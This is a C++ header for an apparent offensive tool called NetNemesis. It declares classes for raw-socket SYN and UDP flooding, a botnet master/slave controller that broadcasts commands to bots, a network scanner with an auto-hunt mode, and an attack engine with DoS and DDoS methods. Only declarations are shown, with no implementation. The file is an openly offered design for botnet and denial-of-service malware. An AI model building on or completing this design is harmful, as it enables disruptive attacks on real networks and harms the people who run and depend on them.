#ifndef NETNEMESIS_H
#define NETNEMESIS_H

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <queue>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>

#define PACKET_SIZE 4096
#define DEFAULT_BOTNET_PORT 6666

extern std::atomic<bool> g_running;
extern std::atomic<bool> g_is_master;
extern std::atomic<bool> g_is_slave;
extern std::atomic<bool> g_auto_hunt;
extern std::mutex g_print_mutex;
extern std::atomic<bool> scanner_running;

bool checkRoot();

class PacketCrafter {
private:
    int raw_socket;
    struct sockaddr_in dest_addr;
    unsigned short calculateChecksum(unsigned short *buf, int nwords);
    void buildIpHeader(struct iphdr *iph, int dest_ip, int packet_len);
    void buildTcpHeader(struct tcphdr *tcph, int src_port, int dest_port, int seq, int ack, int flags);
    
public:
    PacketCrafter();
    ~PacketCrafter();
    bool initialize();
    void sendSYNFlood(const std::string &target, int port, int packets);
    void sendUDPFlood(const std::string &target, int port, int packets);
};

class BotnetManager {
private:
    int master_socket;
    std::vector<int> slave_sockets;
    std::thread listener_thread;
    std::thread slave_thread;
    std::mutex slaves_mutex;
    std::string master_ip;
    int master_port;
    
    void masterListener();
    void slaveConnector();
    
public:
    BotnetManager();
    void startMaster(int port);
    void startSlave(const std::string &ip, int port);
    void broadcastToSlaves(const std::string &cmd);
    void stop();
    bool isMaster() const;
    bool isSlave() const;
};

class NetworkScanner {
private:
    std::thread scan_thread;
    std::vector<std::pair<std::string, int>> discovered_servers;
    std::mutex servers_mutex;
    
    void scanLoop();
    bool probePort(const std::string &ip, int port);
    void scanRange(int start_host, int end_host, const std::vector<int> &ports, 
                   std::atomic<int> &progress, int total_hosts);  // AGGIUNGI QUESTA
    
public:
    NetworkScanner();
    void start();
    void stop();
    std::vector<std::pair<std::string, int>> getServers();
};

class AttackEngine {
private:
    PacketCrafter packet_crafter;
    BotnetManager *botnet;
    
public:
    AttackEngine(BotnetManager *bm);
    void executeDOS(const std::string &target, int port, bool use_raw = true);
    void executeDDOS(const std::string &target, int port, int bots);
    void executeHunt();
};

class NetNemesisCLI {
private:
    BotnetManager botnet;
    NetworkScanner scanner;
    AttackEngine attack_engine;
    
    void showBanner();
    void botnetInteractiveMenu();
    
public:
    NetNemesisCLI();
    void run();
};

namespace Utils {
    void logInfo(const std::string &msg);
    void logSuccess(const std::string &msg);
    void logError(const std::string &msg);
    void logWarning(const std::string &msg);
    void logAttack(const std::string &msg);
    void clearScreen();
    std::vector<std::string> split(const std::string &s, char delim);
    void animateAttack(const std::string &type, const std::string &target);
}

#endif